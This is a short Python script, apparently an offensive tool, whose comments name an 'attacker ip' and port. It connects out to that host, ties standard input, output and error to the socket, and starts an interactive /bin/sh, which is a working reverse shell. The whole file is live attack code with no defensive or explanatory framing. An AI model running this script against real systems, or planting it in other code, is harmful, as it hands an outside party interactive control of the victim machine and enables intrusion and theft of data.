#!/usr/bin/env python

# Argument 1 = attacker ip, Argument 2 = attacker port
# The machine being connected to should be listening using netcat, or similar

import socket,subprocess,os,sys
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((sys.argv[1],int(sys.argv[2])))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
